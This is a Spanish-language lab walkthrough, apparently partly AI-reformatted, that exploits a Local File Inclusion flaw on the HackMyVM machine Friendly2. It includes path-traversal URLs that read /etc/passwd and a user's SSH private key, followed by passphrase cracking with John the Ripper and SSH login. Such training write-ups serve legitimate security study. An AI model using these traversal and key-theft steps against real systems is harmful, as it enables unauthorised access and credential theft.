
---
- TAG: #Explotación #Vulnerabilidades #Inclusión #Archivos #Locales #LFI
----
Claro, aquí tienes el contenido con los títulos y subtítulos adecuados:

---

# Explotación de una Vulnerabilidad Local File Inclusion (LFI)

En el blog de hoy, vamos a aprender a realizar un **Local File Inclusion (LFI)** en una página web vulnerable. Hay muchas formas de realizar un **LFI**, pero esta vez lo aprenderemos de una manera sencilla y básica, adecuada para el nivel del examen.

Para ello, utilizaremos una máquina víctima de **HackMyVM**.

- Máquina: [Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2)
- Máquina atacante: Linux

## Procedimiento

### 1. Preparación del Entorno

Una vez descargada la máquina vulnerable y exportada a nuestro VirtualBox, estamos listos para proceder.

1. **Arp-scan** para localizar la máquina víctima.
2. **Ping** para ver el tipo de TTL y entender a qué nos enfrentamos.
3. **Nmap** para encontrar vulnerabilidades y puertos abiertos:
   ```bash
   nmap -p- -sS -sC -sV --open --min-rate=5000 -n -Pn -vvv 1.2.3.4 -oN escaneo
   ```

Al finalizar el escaneo, encontramos dos puertos abiertos: `22` (SSH) y `80` (HTTP). Al acceder a la página web a través del navegador en el puerto 80, vemos una página web sencilla.

### 2. Exploración de la Página Web

1. **Revisar el código fuente** presionando `Ctrl + U`.
   No vemos nada interesante, así que continuamos.

2. **Fuzzing Web**:
   ```bash
   dirb http://1.2.3.4
   ```

Con este ataque rápido, encontramos dos directorios: `/assets` y `/tools`.

3. Al probar el primer directorio, encontramos un mensaje de **Información privada**. Revisamos el código fuente (`Ctrl + U`) y encontramos información sensible en un comentario:
   ```bash
   check_if_exist.php?doc=keyboard.html
   ```

Agregamos esta información al final de la URL:
   ```bash
   http://1.2.3.4/tools/check_if_exist.php?doc=keyboard.html
   ```

Vemos una página sencilla con la imagen de un teclado. Ahora, realizaremos el ataque **Local File Inclusion (LFI)**.

### 3. Realización del Ataque Local File Inclusion (LFI)

Cuando vemos algo similar a `doc=keyboard.html` en una URL, siempre que esté llamando a un parámetro o archivo, es probable que sea vulnerable a **LFI**. Esta vulnerabilidad nos permite retroceder por los directorios hasta acceder a archivos importantes de la máquina víctima.

1. En la URL, reemplazamos `keyboard.html` con `../` para retroceder en los directorios:
   ```bash
   http://1.2.3.4/tools/check_if_exist.php?doc=../../etc/passwd
   ```

Al apuntar a `../etc/passwd`, veremos todos los usuarios registrados en la máquina víctima Linux.

2. Buscamos el fichero **id_rsa** de un usuario existente dentro de la máquina:
   ```bash
   http://1.2.3.4/tools/check_if_exist.php?doc=../../home/gh0st/.ssh/id_rsa
   ```

Al acceder a esta ruta, vemos la **PRIVATE KEY**. Copiamos este archivo a nuestra máquina atacante para obtener acceso a la máquina víctima.

### 4. Uso del Archivo id_rsa para Acceder a la Máquina Víctima

1. Hacemos `Ctrl + U` en la página web con la clave.
2. Copiamos toda la clave.
3. En nuestra máquina Kali Linux, creamos un archivo con `nano` o `nvim`:
   ```bash
   nano id_rsa
   ```

4. Pegamos toda la clave, guardamos y salimos.
5. Le asignamos el permiso `600`:
   ```bash
   chmod 600 id_rsa
   ```

6. Ingresamos utilizando el archivo `id_rsa` con el usuario `gh0st`:
   ```bash
   ssh -i id_rsa gh0st@1.2.3.4
   ```

7. Nos pedirá el salvoconducto. Utilizamos **John The Ripper** para crackear el **id_rsa**:
   ```bash
   ssh2john id_rsa > hash
   john --wordlist=/usr/share/wordlist/rockyou.txt hash
   ```

8. Volvemos a ingresar con `ssh` y, esta vez, cuando nos pida el salvoconducto, ingresamos la credencial `celctic`:
   ```bash
   ssh -i id_rsa gh0st@1.2.3.4
   ```

Pegamos el salvoconducto encontrado y ya estaremos dentro.

### Resumen

1. Hemos explotado un **Local File Inclusion** para encontrar información valiosa de la víctima, específicamente el archivo `id_rsa`.
2. Hemos obtenido dicho archivo `id_rsa` y le hemos proporcionado el permiso `600`.
3. Lo hemos crackeado localmente con **John The Ripper** para obtener el salvoconducto.
4. Ingresamos como el usuario `gh0st` en la máquina víctima.

---
